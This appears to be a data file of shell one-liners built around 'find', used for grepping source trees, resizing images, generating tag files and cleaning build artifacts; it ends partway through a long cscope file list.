"find . -name ""*.py"" -print0 | xargs -0 grep"
"find . -name ""*.py"" -print | xargs grep -n"
"find . -name ""*.py"" -or -name ""*.pyi"" | xargs grep -nE"
"find . -name ""*.py"" -o -name ""*.ini"" -o -name ""*.yaml"" -o -name ""*.conf"" -type f | xargs grep -nHi "
"find . -name ""*.py"" -not -path ""*/tests/*"" | xargs grep -in --colour"
"find . -name ""*.properties""|xargs grep"
"find . -name ""*.png"" | xargs pngquant 256 --force --skip-if-larger --speed 1 --ext .png"
"find . -name ""*.png"" | xargs mogrify -colorspace RGB -filter LanczosRadius -distort Resize 50% -colorspace sRGB"
"find . -name ""*.png"" | xargs mogrify -colorspace RGB -filter LanczosRadius -distort Resize 25% -colorspace sRGB"
"find . -name ""*.pm"" | xargs grep"
"find . -name ""*.pl"" | xargs egrep -nw $1"
"find . -name ""*.pl"" -print | xargs grep -n"
"find . -name ""*.php""|xargs grep -nE "
"find . -name ""*.php"" | xargs grep"
"find . -name ""*.php"" | xargs grep -n"
"find . -name ""*.php"" | xargs grep -n --color=auto"
"find . -name ""*.php"" | xargs grep -inr"
"find . -name ""*.php"" | xargs grep --color=auto"
"find . -name ""*.php"" | xargs grep --color"
"find . -name ""*.php"" | xargs grep $2 -wn $3"
"find . -name ""*.php"" -print0 | xargs -0 grep --color -n $*"
"find . -name ""*.php"" -print0 | xargs -0 -n1 -P8 php -d display_errors=1 -l"
"find . -name ""*.php"" -print | xargs grep $1"
"find . -name ""*.php"" -print | xargs -l10 grep --color "
"find . -name ""*.php"" -o -name ""*.phpt"" | xargs egrep -n --color"
"find . -name ""*.php"" -exec php -l {} \; |grep -v ""No syntax error"""
"find . -name ""*.php"" -exec php -l {} \; | grep -v ""No syntax errors"""
"find . -name ""*.php"" -exec php -l {} \; | grep -v ""No syntax errors detected in"""
"find . -name ""*.php"" -exec php -l {} \; | grep ""Parse error"""
"find . -name ""*.php"" -and -not -path ""*tests/*"" -print0 | xargs -0 grep --color -n $*"
"find . -name ""*.orig"" | xargs rm -f"
"find . -name ""*.orig"" -print0 | xargs -0 rm"
"find . -name ""*.orig"" -print0 | xargs -0 rm -rf"
"find . -name ""*.mp3"" | wc -l"
"find . -name ""*.mmd"" -print0 | xargs -0 -n1 -I {} multimarkdown {} > mmdCompiledDocument.html"
"find . -name ""*.mmd"" -print0 | xargs -0 -n1 -I {} multimarkdown --batch {} > {}.html"
"find . -name ""*.mk"" | xargs egrep --color -n"
"find . -name ""*.mib"" | xargs egrep -nw $1"
"find . -name ""*.md"" | while read i; do md=`markdown ""$i""` ./template >! ""${i%.*}.html""; done"
"find . -name ""*.m"" -print0 | xargs -0 grep"
"find . -name ""*.lua"" -print | xargs grep --color=auto -n "
"find . -name ""*.lock"" | xargs rm -rf"
"find . -name ""*.jsp""|xargs grep"
"find . -name ""*.js""|xargs grep"
"find . -name ""*.js"" |xargs grep -n --color=auto $* 2>/dev/null"
"find . -name ""*.js"" | xargs wc -l"
"find . -name ""*.js"" | xargs grep"
"find . -name ""*.js"" | xargs grep -n"
"find . -name ""*.js"" | xargs grep --color=auto"
"find . -name ""*.js"" | xargs grep "
"find . -name ""*.jpg"" | xargs mogrify -colorspace RGB -filter LanczosRadius -distort Resize 50% -colorspace sRGB"
"find . -name ""*.jpg"" | xargs mogrify -colorspace RGB -filter LanczosRadius -distort Resize 25% -colorspace sRGB"
"find . -name ""*.java""|xargs grep"
"find . -name ""*.java"" | xargs wc -l"
"find . -name ""*.java"" | xargs grep $1 -wn"
"find . -name ""*.java"" | xargs grep "
"find . -name ""*.java"" | xargs egrep -nw $1"
"find . -name ""*.java"" | xargs egrep --color -n"
"find . -name ""*.java"" -print0 |xargs -0 chmod -x"
"find . -name ""*.java"" -print0 | xargs -0 grep -i -n"
"find . -name ""*.java"" -print | xargs grep $1 -H -n"
"find . -name ""*.java"" -o -name ""*.xml"" -o -name ""*.properties"" -type f | xargs grep -nHi "
"find . -name ""*.hxml"" | xargs grep -n"
"find . -name ""*.html""|xargs grep"
"find . -name ""*.html"" | xargs grep"
"find . -name ""*.html"" | xargs grep -n"
"find . -name ""*.html"" | xargs grep -inr"
"find . -name ""*.html"" | xargs grep "
"find . -name ""*.html"" -print0 | xargs -0 sed -i """" -e ""s/token-search/token-options/g"""
"find . -name ""*.ht*"" | while read i; do pandoc -f html -t markdown ""$i"" -o ""${i%.*}.md""; done"
"find . -name ""*.hs""|xargs grep"
"find . -name ""*.hpp"" | xargs grep -n"
"find . -name ""*.hpp"" | xargs grep -n --color=auto"
"find . -name ""*.h""|xargs grep"
"find . -name ""*.h""|xargs grep --color"
"find . -name ""*.h""|xargs grep --color -n"
"find . -name ""*.h""|xargs grep "
"find . -name ""*.h"" |xargs grep -n -w"
"find . -name ""*.h"" |xargs grep -n --color=auto $* 2>/dev/null"
"find . -name ""*.h"" | xargs grep"
"find . -name ""*.h"" | xargs grep \!* /dev/null"
"find . -name ""*.h"" | xargs grep -rn "
"find . -name ""*.h"" | xargs grep -n"
"find . -name ""*.h"" | xargs grep -n --color=auto"
"find . -name ""*.h"" | xargs egrep --color -n"
"find . -name ""*.h"" -print0 | xargs -0 grep"
"find . -name ""*.h"" -print | xargs grep -s -n $2 $1"
"find . -name ""*.h"" -print | xargs grep -n"
"find . -name ""*.h"" -or -name ""*.c"" -or -name ""*.cpp"" -or -name ""*.cc"" | xargs grep \!* /dev/null"
"find . -name ""*.h"" -o -name ""*.hpp"" -o -name ""*.c"" -o -name ""*.cpp"" -print0 | xargs -0 grep --color -n"
"find . -name ""*.h"" -o -name ""*.c"" | xargs grep "
"find . -name ""*.h"" -o -name ""*.c"" -o -name ""*.cpp"" -o -name ""*.cxx"" -o -name ""*.cc"" | xargs wc -l"
"find . -name ""*.gypi"" | xargs egrep --color -n"
"find . -name ""*.gyp"" | xargs egrep --color -n"
"find . -name ""*.gram"" | xargs egrep -nw $1"
"find . -name ""*.go"" | xargs grep -nE"
"find . -name ""*.go"" -o -name ""*.ini"" -o -name ""*.yaml"" -o -name ""*.json"" -type f | xargs grep -nHi "
"find . -name ""*.go"" -not -path ""*/tests/*"" | xargs grep -in --colour"
"find . -name ""*.ex"" -or -name ""*.exs""| xargs grep -nE"
"find . -name ""*.erb""|xargs grep"
"find . -name ""*.el"" | xargs grep -n"
"find . -name ""*.el"" | xargs grep -n --color=auto"
"find . -name ""*.dart"" | xargs grep -nE"
"find . -name ""*.css""|xargs grep"
"find . -name ""*.css"" | xargs grep"
"find . -name ""*.css"" | xargs grep --color=auto"
"find . -name ""*.cs""|xargs grep --color"
"find . -name ""*.cs"" -print0 | xargs -0 grep"
"find . -name ""*.cpp""|xargs grep --color"
"find . -name ""*.cpp""|xargs grep "
"find . -name ""*.cpp"" | xargs grep -n"
"find . -name ""*.cpp"" | xargs grep -n --color=auto"
"find . -name ""*.cpp"" | xargs egrep --color -n"
"find . -name ""*.cpp"" -print0 | xargs -0 grep"
"find . -name ""*.cpp"" -print | xargs grep -s -n $2 $1"
"find . -name ""*.cpp"" -or -name ""*.h"" -or -name ""*.cc"" -or -name ""*.c"" -or -name ""*.m"" | xargs grep -nE"
"find . -name ""*.cpp"" -o -name ""*.h"" | xargs grep --color -n -H $1"
"find . -name ""*.cpp"" -o -name ""*.h"" | xargs egrep -n --color"
"find . -name ""*.cpp"" -o -name ""*.c"" |xargs grep -n --color=auto $* 2>/dev/null"
"find . -name ""*.cpp"" -o -name ""*.c"" -o -name ""*.h"" |xargs grep -n --color=auto $* 2>/dev/null"
"find . -name ""*.cpp"" -o -name ""*.c"" -o -name ""*.h"" | xargs grep -a"
"find . -name ""*.conf"" | xargs egrep --color -n"
"find . -name ""*.cljs"" -print0 | xargs -0 wc -l"
"find . -name ""*.clj"" -print0 | xargs -0 wc -l"
"find . -name ""*.cc"" | xargs egrep --color -n"
"find . -name ""*.c""|xargs grep"
"find . -name ""*.c""|xargs grep --color -n"
"find . -name ""*.c"" |xargs grep -n -w"
"find . -name ""*.c"" | xargs grep -n"
"find . -name ""*.c"" | xargs grep -n --color=auto"
"find . -name ""*.c"" | xargs egrep --color -n"
"find . -name ""*.c"" -print0 | xargs -0 grep"
"find . -name ""*.c"" -print | xargs grep -n"
"find . -name ""*.[he]rl"" -print | etags -"
"find . -name ""*.[hc]*"" | xargs wc -l"
"find . -name ""*.[hcSs]"" -print | xargs egrep $1"
"find . -name ""*.[hH]"" |xargs grep --color --exclude=""*svn*"" --exclude=""cscope.*"" --exclude=""*tags*"" -n $1"
"find . -name ""*.[hC]"" -print | xargs grep -s -n $2 $1"
"find . -name ""*.[chsS]"" | xargs grep --color"
"find . -name ""*.[chsS]"" | xargs egrep -nw $1"
"find . -name ""*.[chsS]"" -print | xargs grep -n"
"find . -name ""*.[ch]"" | xargs grep"
"find . -name ""*.[ch]"" | xargs grep -n"
"find . -name ""*.[ch]"" | xargs grep --color"
"find . -name ""*.[ch]"" | xargs grep "
"find . -name ""*.[ch]"" | xargs etags"
"find . -name ""*.[ch]"" -print0 | xargs -0 grep -i -n"
"find . -name ""*.[ch]"" -o -name ""*.cpp"" -o -name ""*.asp"" -o -name ""*.js"" -o -name ""*.css"" -o -name ""Makefile"" -o -name ""cy_configure"" | xargs grep -inI ./ -e"
"find . -name ""*.[chS]"" | xargs grep -i -n --color"
"find . -name ""*.[chCHsS]"" -print | xargs etags -a -o TAGS"
"find . -name ""*.[chCH]"" -print | etags -"
"find . -name ""*.[chCHS]"" -print | etags -"
"find . -name ""*.[cChHp]*"" -print| etags -"
"find . -name ""*.[cChH]"" | etags -"
"find . -name ""*.[cC]"" |xargs grep --color --exclude=""*svn*"" --exclude=""cscope.*"" --exclude=""*tags*"" -n $1"
"find . -name ""*.[c,h]"" |xargs grep -n -w"
"find . -name ""*.DS_Store"" | xargs rm -v"
"find . -name ""*.DS_Store"" -or -name ""*.swp"" -or -name ""*.bak"" -type f | xargs -0 rm -v"
"find . -name ""*.C"" -print | xargs grep -s -n $2 $1"
"find . -name ""*.*c"" | xargs grep"
"find . -name ""*.*"" |xargs grep --color --exclude=""*svn*"" --exclude=""cscope.*"" --exclude=""*tags*"" --exclude=""*.o*"" --directories=skip -n $1"
"find . -name ""*.*"" | xargs grep -ns "
"find . -name ""*.*"" | xargs grep --color=always"
"find . -name ""*.*"" | xargs dos2unix"
"find . -name ""*""|grep -i"
"find . -name ""*"" |xargs grep -sin"
"find . -name ""*"" |xargs grep -n -w"
"find . -name ""*"" |grep -sin"
"find . -name ""*"" | xargs wc -l"
"find . -name ""*"" | xargs grep"
"find . -name ""*"" | xargs grep -nsI"
"find . -name ""*"" | xargs grep $1 2> /dev/null"
"find . -name ""*"" -type f | xargs egrep -l "".* +$"""
"find . -name ""*"" -type f -print0 | xargs -n 1 --null touch"
"find . -name ""*"" -print0 | xargs -0 wc -l"
"find . -name ""*"" -print | xargs grep -n"
"find . -name ""*"" -not -path ""*/.git/*"" -not -path ""*/.svn/*"" -print | sed -E -e "
"find . -name ""$2"" | xargs grep -Hni ""$1"""
"find . -mtime 7 -type f -printf "" %CY-%Cm-%Cd %Ca %CH:%CM - %p\n"" | sed ""s#\./##"""
"find . -mtime -7 -type f -printf "" %CY-%Cm-%Cd %Ca %CH:%CM - %p\n"" | sed ""s#\./##"""
"find . -mmin -10 | sed -n '2,\$p'"
"find . -maxdepth 3 -name settings_local.py -print0 | xargs -0 grep ""bargain_auto"""
"find . -maxdepth 2 -mindepth 1 -name .git -type d -prune | while read d; do cd $d/..; gecho -e ""${Cyan}$PWD ${Color_Off} git pull""; git pull; cd $OLDPWD; done"
"find . -maxdepth 1 \( -type f -name ""*.vhd"" \) | sed -e "
"find . -maxdepth 1 \( -type f -name ""*.cpp"" -o -name ""*.hpp"" \) | sed -e "
"find . -maxdepth 1 \( -type f -name ""*.cpp"" -o -name ""*.hpp"" \) -printf ""%P\n"" | sort "
"find . -maxdepth 1 \( -type f -name ""*.c"" -o -name ""*.h"" \) | sed -e "
"find . -maxdepth 1 \( -type f -name ""*.c"" -o -name ""*.h"" \) -printf ""%P\n"" | sort "
"find . -maxdepth 1 -type f | sed ""s@./@@"""
"find . -maxdepth 1 -type f -name "".*"" | more"
"find . -maxdepth 1 -type d | sed ""s!./!!"""
"find . -maxdepth 1 -type d -not -name . -printf ""%f\n"" | column -c 80"
"find . -maxdepth 1 -type d ! -name \. -regex ""\./\..*"" -print0 | xargs -0 ls -ld "
"find . -maxdepth 1 -type d ! -name \. ! -regex ""\./\..*"" -print0 | xargs -0 ls -ld "
"find . -maxdepth 1 -path ""*/.*"" -type d | sort"
"find . -maxdepth 1 -path ""*./.*"" -type f | sort"
"find . -maxdepth 1 -not -path ""*./.*"" -type f | sort"
"find . -maxdepth 1 -not -path ""*./.*"" -type d | sort"
"find . -maxdepth 1 -name "".*"" -type f |sort"
"find . -maxdepth 1 -name "".*"" -type d |sort"
"find . -maxdepth 1 -name "".*"" -ls |column -t"
"find . -maxdepth 1 -name ""*~"" -o -name "".*~"" -type f | xargs rm -vf"
"find . -maxdepth 1 -name ""*~"" -o -name "".*~"" -type f | xargs echo"
"find . -maxdepth 1 -name ""*"" -type f |sort"
"find . -maxdepth 1 -iname ""*.nzb"" | while read f; do echo ""To add: \""$f\""""; nzbget -A F ""$f"" && rm ""$f"" && sleep 1; done"
"find . -iname *.pyc -delete && cvs update -d -P 2>&1 | grep -v ""^cvs update:"""
"find . -iname ""obj"" -print0 | xargs -0 rm -rf"
"find . -iname ""bin"" -print0 | xargs -0 rm -rf"
"find . -iname ""bin"" -o -iname ""obj"" | xargs rm -rf"
"find . -iname ""__MACOSX"" -print0 | xargs -0 rm -rf"
"find . -iname ""P*.jpg"" -print0 | xargs -0 exiftool -ImageDescription= -CameraID= -overwrite_original_in_place -P"
"find . -iname "".svn"" -print0 | xargs -0 rm -r"
"find . -iname ""*~""|xargs rm"
"find . -iname ""*~"" | xargs rm"
"find . -iname ""*~"" | while read f; do rm ""$f""; echo ""removed $f""; done"
"find . -iname ""*tex"" | xargs grep --color=auto"
"find . -iname ""*py"" | xargs grep --color=auto"
"find . -iname ""*m3u"" -print0 | xargs -0 rm"
"find . -iname ""*kconfig*"" | xargs grep -inH --color=auto "
"find . -iname ""*.sw*"" | xargs rm"
"find . -iname ""*.scala"" | xargs grep -ni --color=always "
"find . -iname ""*.rb"" -type f -exec wc -l {} \; | sort -rn"
"find . -iname ""*.rb"" -type f -exec cat {} \; | wc -l"
"find . -iname ""*.qml"" | xargs grep -ni --color=always "
"find . -iname ""*.pyc""|xargs rm"
"find . -iname ""*.pyc"" |xargs rm -fv"
"find . -iname ""*.pyc"" | xargs rm"
"find . -iname ""*.py"" | entr -p mypy --ignore-missing-imports /_"
"find . -iname ""*.py"" -print0 | sort > src.files.py;"
"find . -iname ""*.png"" | xargs pngquant --quality=90-98 --ext "".png"" -f "
"find . -iname ""*.orig"" | xargs rm"
"find . -iname ""*.mp3"" | mpg123 --continue -E ~/.mpg_equal.txt --stereo --float --rva-album --rva-mix --title --fuzzy --long-tag -Z --list -"
"find . -iname ""*.jpg"" -o -iname ""*.jpeg"" | xargs jpegoptim --strip-all"
"find . -iname ""*.java"" | xargs grep -ni --color=always "
"find . -iname ""*.h"" | xargs grep -ni --color=always "
"find . -iname ""*.h"" | xargs grep --color -n -s "
"find . -iname ""*.h"" -o -iname ""*.c"" | xargs clang-format -i"
"find . -iname ""*.h"" -o -iname ""*.c"" -o -name ""*.cpp"" -o -name ""*.cc"" | xargs grep -ni --color=always "
"find . -iname ""*.cs"" | xargs grep --color -n -s "
"find . -iname ""*.cpp"" | xargs grep -ni --color=always "
"find . -iname ""*.cpp"" | xargs grep --color -n -s "
"find . -iname ""*.class"" |xargs rm -fv"
"find . -iname ""*.c"" -o -name ""*.cpp"" -o -name ""*.cc"" | xargs grep -ni --color=always "
"find . -iname ""*.c"" -o -iname ""*.h"" | xargs grep --color -n -s "
"find . -iname ""*.aux"" -or -iname ""*.log"" -or -iname ""*.out"" -or -iname ""*.toc"" -or -iname ""*.sum"" -or -iname ""*.tcp"" | xargs rm -f -"
"find . -iname ""*.[s]"" | xargs grep --color=auto -inH "
"find . -iname ""*.[o]"" | xargs grep --color=auto -inH "
"find . -iname ""*.[h]"" | xargs grep --color=auto -nH "
"find . -iname ""*.[h]"" | xargs grep --color=auto -inH "
"find . -iname ""*.[chs]"" | xargs grep --color=auto -nH "
"find . -iname ""*.[chs]"" | xargs grep --color=auto -inH "
"find . -iname ""*.[ch]"" | xargs grep --color=auto -nH "
"find . -iname ""*.[ch]"" | xargs grep --color=auto -inH "
"find . -iname ""*.[ch]"" -o -iname \*.hpp -o -iname \*.cpp | sort > src.files;"
"find . -iname ""*.[c]"" | xargs grep --color=auto -nH "
"find . -iname ""*.[c]"" | xargs grep --color=auto -inH "
"find . -iname ""*.*"" | xargs grep -ni --color=always "
"find . -iname ""*.*"" -print0 | xargs -0 grep -i -l"
"find . -iname ""*$@*"" | less"
"find . -iname ""*$1*"" -print0 | xargs -0i bash -c ""echo {} && open {}"""
"find . -iname ""*"" | xargs grep -ni --color=always "
"find . -depth | rename ""s/\ /_/g"""
"find . -depth | rename "" "" ""_"" *"
"find . -depth -mindepth 1 -exec mvcase -l {} \; | grep ""Could not move"""
"find . -daystart -mtime 7 -type f -printf "" %CY-%Cm-%Cd %Ca %CH:%CM - %p\n"" | sed ""s#\./##"""
"find . -daystart -mtime 1 -type f -printf "" %CY-%Cm-%Cd %Ca %CH:%CM - %p\n"" | sed ""s#\./##"""
"find . -daystart -mtime 0 -type f -printf "" %CY-%Cm-%Cd %Ca %CH:%CM - %p\n"" | sed ""s#\./##"""
"find . - name ""*.bb"" | xargs egrep --color -n"
"find . ""-name"" "".DS_Store"" | xargs rm -f "
"find . ! -path ""./_*"" ! -path ""./.git*"" ! -type l ! -type d -print0 | xargs -0 grep --color=auto"
"find . ! -path ""*.git*"" -name ""*.md"" | xargs -I {} markdown-toc -i {}"
"find . ! -name ""*svn*"" -and ! -name ""*_test*"" -and ! -name ""*cscope*"" -and ! -name ""*.o"" -and ! -name ""*.a"" | xargs grep --color -nE"
"find . ! -name ""*.so"" -and ! -name ""*.a"" -and ! -name ""*svn*"" -and ! -name ""*_test*"" -and ! -name ""*cscope*"" | xargs grep --color -nE"
"find -type f | awk -v IGNORECASE=1 'gsub(/ /, \"
"find -type f \( -iname ""*.jpg"" -o -iname ""*.jpeg"" -o -iname ""*.jpe"" -o -iname ""*.jif"" -o -iname ""*.jfif"" -o -iname ""*.jfi"" \) -print0 |
"find -type f -not -path ""*/.*"" -not -path ""*/build/*"" -not -name "".*"" -not -name ""*.pyc"" -not -name ""*.so"" -not -name ""*.o"" -not -name ""*.egg"" -print0 | xargs -0 egrep --color -iH"
"find -type f -not -name ""tags"" -not -name ""*[._]log"" -not -path ""*/.git/*"" -not -path ""*/common/*"" -not -path ""*/.svn/*"" -not -path ""*/packages/*"" -print0 | xargs -0 fgrep --color -iH"
"find -type f -not -name ""tags"" -not -name ""*[._]log"" -not -path ""*/.git/*"" -not -path ""*/common/*"" -not -path ""*/.svn/*"" -not -path ""*/packages/*"" -print0 | xargs -0 egrep --color -iH"
"find -type f -not -ipath ""./.git/*"" -printf ""%M %u %g %TY%Tm%Td %TH:%TM:%.2TS %p\n"" | sort -k4"
"find -type f -name ""rfc*.txt"" -print0 |xargs -0 grep -an --color=$COLOR_FLAG"
"find -type f -name ""BUILD.gn"" | xargs grep"
"find -type f -name ""BUILD*"" -print0 | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find -type f -name ""*~"" | xargs rm -vfr "
"find -type f -name ""*.py"" | xargs grep"
"find -type f -name ""*.py"" -print0 |xargs -0 grep -aHn --color=$COLOR_FLAG"
"find -type f -name ""*.py"" -not -path ""*/.*"" -not -path */build/* -print0 | xargs -0 egrep --color -iH"
"find -type f -name ""*.php"" |xargs grep -rn "
"find -type f -name ""*.mp3"" | while read mp3; do mplayer -af scaletempo -speed 1.8 $mp3; done"
"find -type f -name ""*.js"" |xargs grep -rn "
"find -type f -name ""*.java"" | xargs grep"
"find -type f -name ""*.cc"" -o -name ""*.c"" -o -name ""*.h"" | xargs grep"
"find -type f -name ""*"" | xargs grep "
"find -type f -iname ""*.dcd"" -exec md5sum {} \; | sort -k 2"
"find -type f -exec file {} \; | grep -P ""PE32\+? executable"""
"find -type d -wholename ""*wwwroot/lib*"" | xargs rm -vfr "
"find -type d -name ""*node_modules*"" | xargs rm -vfr "
"find -type d -name ""*bower_components*"" | xargs rm -vfr "
"find -type d -name ""*bin*"" | xargs rm -vfr "
"find -type d -name ""*artifacts*"" | xargs rm -vfr "
"find -type d -name ""*Release*"" | xargs rm -vfr "
"find -type d -name ""*Debug*"" | xargs rm -vfr "
"find -name .DS_Store -type f | xargs -i rm ""{}"""
"find -name *.json -type f -exec sh -c ""uni2ascii -q -a U {} | sponge {}"" \; -exec echo {} \; 1>&2 > enc_errors"
"find -name *.json -type f -exec sh -c ""uni2ascii -a U {} | sponge {}"" \; -exec sh -c ""echo {} 1>&2"" \; 2> enc_error"
"find -name "".fuse_hidden*""; find -name "".fuse_hidden*"" | xargs rm -f"
"find -name ""*~"" | xargs rm"
"find -name ""*~"" | xargs -I % rm %"
"find -name ""*.tpl"" | xargs grep -n"
"find -name ""*.tpl"" | xargs grep -i -n"
"find -name ""*.sln"" | while read sln; do vs17Devenv $sln; done &"
"find -name ""*.sln"" | while read sln; do vs15Devenv $sln; done &"
"find -name ""*.rb"" -or -name ""*.rhtml"" -or -name ""*.rjs"" -or -name ""*.rxml"" | xargs grep"
"find -name ""*.rar"" | parallel unrar x {}"
"find -name ""*.py"" | xargs grep"
"find -name ""*.py"" | xargs grep -n"
"find -name ""*.pl"" | xargs grep"
"find -name ""*.php"" | xargs grep"
"find -name ""*.php"" | xargs grep -n"
"find -name ""*.php"" | xargs grep -i -n"
"find -name ""*.orig"" | xargs rm"
"find -name ""*.mp3"" -print0 | xargs -0 chmod 644"
"find -name ""*.java"" | xargs grep"
"find -name ""*.hrl"" -o -name ""*.erl"" |xargs grep --color=auto -n"
"find -name ""*.h"" -print | xargs grep"
"find -name ""*.h"" -or -name ""*.hpp"" -or \( -not -name ""*.*"" -and -not -type d \) | xargs grep"
"find -name ""*.h"" -o -name ""*.c"" -o -name ""*.hpp"" -o -name ""*.cpp"" -o -name ""CMakeLists.txt"" | ack --files-from=- "
"find -name ""*.flac"" | parallel ffmpeg -i {} -acodec libmp3lame -ab 320k {.}.mp3 ""&&"" rm {}"
"find -name ""*.c"" -print | xargs grep"
"find -name ""*.c"" -or -name ""*.cc"" -or -name ""*.cpp"" | xargs grep"
"find -name ""*.[ch]"" -print | xargs grep"
"find -name ""*.[ch]"" -o -name ""*.cpp"" -o -name ""*.cc"" -o -name ""*.hh"" | etags -"
"find -name ""*.*"" -type f | xargs grep --color=auto"
"find -name ""* *"" -type f | rename ""s/ /_/g"""
"find -maxdepth 6 -not -ipath ""*compfest*"" -type d 2> /dev/null | fzf"
"find -maxdepth 1 -type f -exec sh -c ""ls -la {} | \
"find -maxdepth 1 -regex '^\.\/\..+' -ls | awk '{print \$3,\$4,\$5,\$6,\$7,\"
"find -maxdepth 1 -name "".*"" -not -name ""."" -printf ""%f\n"" | xargs ls -d --color=auto"
"find -iname ""__pycache__"" | xargs rm -r"
"find -iname ""*.pyx"" | xargs grep --color -n"
"find -iname ""*.pyc"" | xargs rm"
"find -iname ""*.py"" | xargs pep8"
"find -iname ""*.py"" | xargs grep --color -n"
"find -iname ""*.pxd"" | xargs grep --color -n"
"find -iname ""*.mp3"" -print0 | xargs -0 mid3iconv -eCP1251 --remove-v1"
"find -O3 . -name ""*~"" -or -name ""*.bak"" -or -name ""#*#"" -or -name ""Thumbs.db"" -or -name ""desktop.ini"" -type f | xargs rm -f "
"find -L . \( ! -name "".git"" -a ! -name "".idea"" -o -prune \) -type f -print0 | xargs -0 grep -C 10 --color=auto -in"
"find -L . \( ! -name "".git"" -a ! -name "".idea"" -o -prune \) -type f -print0 | xargs -0 grep --color=auto -in"
"find -L . -name .svn -prune -o -name .git -prune -o -name ""*~"" -prune -o -name "".nfs*"" -prune -o -type f -print0 | xargs -0 grep --binary-files=without-match"
"find -L . -name ""*"" | filter"
"find -L err.txt generated.file succ.txt /usr/include/GL /usr/include/X11 /usr/include/_G_config.h /usr/include/aio.h /usr/include/aliases.h /usr/include/alloca.h /usr/include/ar.h /usr/include/argp.h /usr/include/argz.h /usr/include/arpa /usr/include/asm-generic /usr/include/assert.h /usr/include/byteswap.h /usr/include/c++ /usr/include/caml /usr/include/complex.h /usr/include/cpio.h /usr/include/crypt.h /usr/include/ctype.h /usr/include/curses.h /usr/include/cursesapp.h /usr/include/cursesf.h /usr/include/cursesm.h /usr/include/cursesp.h /usr/include/cursesw.h /usr/include/cursslk.h /usr/include/dirent.h /usr/include/dlfcn.h /usr/include/drm /usr/include/elf.h /usr/include/endian.h /usr/include/envz.h /usr/include/err.h /usr/include/errno.h /usr/include/error.h /usr/include/eti.h /usr/include/etip.h /usr/include/execinfo.h /usr/include/expat.h /usr/include/expat_external.h /usr/include/fcntl.h /usr/include/features.h /usr/include/fenv.h /usr/include/fmtmsg.h /usr/include/fnmatch.h /usr/include/form.h /usr/include/fstab.h /usr/include/fts.h /usr/include/ftw.h /usr/include/gconv.h /usr/include/getopt.h /usr/include/glob.h /usr/include/gnu-versions.h /usr/include/gnumake.h /usr/include/grp.h /usr/include/gshadow.h /usr/include/iconv.h /usr/include/ifaddrs.h /usr/include/inttypes.h /usr/include/langinfo.h /usr/include/lastlog.h /usr/include/libgen.h /usr/include/libintl.h /usr/include/libio.h /usr/include/libltdl /usr/include/limits.h /usr/include/link.h /usr/include/linux /usr/include/locale.h /usr/include/ltdl.h /usr/include/malloc.h /usr/include/math.h /usr/include/mcheck.h /usr/include/memory.h /usr/include/menu.h /usr/include/misc /usr/include/mntent.h /usr/include/monetary.h /usr/include/mqueue.h /usr/include/mtd /usr/include/nc_tparm.h /usr/include/ncurses.h /usr/include/ncurses_dll.h /usr/include/net /usr/include/netash /usr/include/netatalk /usr/include/netax25 /usr/include/netdb.h /usr/include/neteconet /usr/include/netinet /usr/include/netipx /usr/include/netiucv /usr/include/netpacket /usr/include/netrom /usr/include/netrose /usr/include/nfs /usr/include/nl_types.h /usr/include/nss.h /usr/include/obstack.h /usr/include/panel.h /usr/include/paths.h /usr/include/poll.h /usr/include/printf.h /usr/include/proc_service.h /usr/include/protocols /usr/include/pthread.h /usr/include/pty.h /usr/include/pwd.h /usr/include/python3.6 /usr/include/python3.6m /usr/include/rdma /usr/include/re_comp.h /usr/include/regex.h /usr/include/regexp.h /usr/include/resolv.h /usr/include/rpc /usr/include/rpcsvc /usr/include/sched.h /usr/include/scsi /usr/include/search.h /usr/include/semaphore.h /usr/include/setjmp.h /usr/include/sgtty.h /usr/include/shadow.h /usr/include/signal.h /usr/include/sound /usr/include/spawn.h /usr/include/stab.h /usr/include/stdc-predef.h /usr/include/stdint.h /usr/include/stdio.h /usr/include/stdio_ext.h /usr/include/stdlib.h /usr/include/string.h /usr/include/strings.h /usr/include/stropts.h /usr/include/sudo_plugin.h /usr/include/syscall.h /usr/include/sysexits.h /usr/include/syslog.h /usr/include/tar.h /usr/include/term.h /usr/include/term_entry.h /usr/include/termcap.h /usr/include/termio.h /usr/include/termios.h /usr/include/tgmath.h /usr/include/thread_db.h /usr/include/tic.h /usr/include/time.h /usr/include/ttyent.h /usr/include/uchar.h /usr/include/ucontext.h /usr/include/ulimit.h /usr/include/unctrl.h /usr/include/unistd.h /usr/include/ustat.h /usr/include/utime.h /usr/include/utmp.h /usr/include/utmpx.h /usr/include/values.h /usr/include/video /usr/include/wait.h /usr/include/wchar.h /usr/include/wctype.h /usr/include/wordexp.h /usr/include/x86_64-linux-gnu /usr/include/xcb /usr/include/xen -name ""*.[ch]"" -o -name ""*.cpp"" > cscope.files; cat ~/my_include/include.files >> cscope.files ; cat cscope.files | xargs etags -a ; cscope -b ; create_TTT"
"find -L err.txt generated.file succ.txt /usr/include/GL /usr/include/X11 /usr/include/_G_config.h /usr/include/aio.h /usr/include/aliases.h /usr/include/alloca.h /usr/include/ar.h /usr/include/argp.h /usr/include/argz.h /usr/include/arpa /usr/include/asm-generic /usr/include/assert.h /usr/include/byteswap.h /usr/include/c++ /usr/include/caml /usr/include/complex.h /usr/include/cpio.h /usr/include/crypt.h /usr/include/ctype.h /usr/include/curses.h /usr/include/cursesapp.h /usr/include/cursesf.h /usr/include/cursesm.h /usr/include/cursesp.h /usr/include/cursesw.h /usr/include/cursslk.h /usr/include/dirent.h /usr/include/dlfcn.h /usr/include/drm /usr/include/elf.h /usr/include/endian.h /usr/include/envz.h /usr/include/err.h /usr/include/errno.h /usr/include/error.h /usr/include/eti.h /usr/include/etip.h /usr/include/execinfo.h /usr/include/expat.h /usr/include/expat_external.h /usr/include/fcntl.h /usr/include/features.h /usr/include/fenv.h /usr/include/fmtmsg.h /usr/include/fnmatch.h /usr/include/form.h /usr/include/fstab.h /usr/include/fts.h /usr/include/ftw.h /usr/include/gconv.h /usr/include/getopt.h /usr/include/glob.h /usr/include/gnu-versions.h /usr/include/gnumake.h /usr/include/grp.h /usr/include/gshadow.h /usr/include/iconv.h /usr/include/ifaddrs.h /usr/include/inttypes.h /usr/include/langinfo.h /usr/include/lastlog.h /usr/include/libgen.h /usr/include/libintl.h /usr/include/libio.h /usr/include/libltdl /usr/include/limits.h /usr/include/link.h /usr/include/linux /usr/include/locale.h /usr/include/ltdl.h /usr/include/malloc.h /usr/include/math.h /usr/include/mcheck.h /usr/include/memory.h /usr/include/menu.h /usr/include/misc /usr/include/mntent.h /usr/include/monetary.h /usr/include/mqueue.h /usr/include/mtd 